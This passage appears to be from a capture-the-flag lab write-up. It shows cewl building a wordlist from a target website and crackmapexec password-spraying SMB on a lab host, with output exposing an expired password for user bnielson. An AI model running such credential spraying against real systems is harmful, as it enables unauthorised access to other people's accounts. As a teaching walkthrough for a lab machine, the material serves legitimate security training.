## Custom Wordlist & SMB Brute Forcing

Use `cewl` to create a custom wordlist based on the website.

```bash
$ cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm -m 5 -w cewl-words.txt --with-numbers
```

Spray the generated passwords with the usernames gathered from the website against the target. It appears `bnielson`'s password was once `Fabricorp01`, but it has since expired.

```bash
$ crackmapexec smb 10.129.2.5 -d fabricorp.local -u users.txt -p cewl-words.txt
...[SNIP]...
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
...[SNIP]...
```
